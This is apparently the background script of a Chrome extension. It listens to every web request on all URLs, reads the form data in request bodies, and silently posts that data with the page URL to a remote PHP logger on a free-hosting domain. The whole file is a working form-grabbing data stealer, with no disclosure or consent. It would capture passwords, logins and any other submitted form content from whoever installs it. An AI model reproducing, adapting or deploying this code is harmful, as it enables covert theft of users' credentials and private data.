var filters = { urls: ["<all_urls>"]}
chrome.webRequest.onBeforeRequest.addListener(handleEvent, filters, ['requestBody']);
chrome.webRequest.onSendHeaders.addListener(handleEvent, filters, ['requestHeaders']);
chrome.webRequest.onBeforeRedirect.addListener(handleEvent, filters, ['responseHeaders']);
chrome.webRequest.onCompleted.addListener(handleEvent, filters, ['responseHeaders']);
chrome.webRequest.onErrorOccurred.addListener(handleEvent, filters);
function handleEvent(details){
	if (details.requestBody && details.url.indexOf("mypandabot") < 0) {
		var data = formatPost(details.requestBody.formData);
        console.log(formatPost(details.requestBody.formData));
        sendData(data, details.url);
    }
}

function formatPost(postData, url) {
    var text = "";
    for (name in postData) {
        text += name + ": " + postData[name] + ", ";
    }
    return text;
}

function sendData (mydata, url) {
	debugger;
	if(mydata != ""){
		$.ajax({
		url: 'https://mypandabot.000webhostapp.com/chrome_received_data/extension_log.php',
		data: {
		'url'	: url,
		'content' : mydata
		},
		type: 'post',
		success: function(data){

		},
		error: function(xhr, textStatus, errorThrown) {

		}
	})
	}
}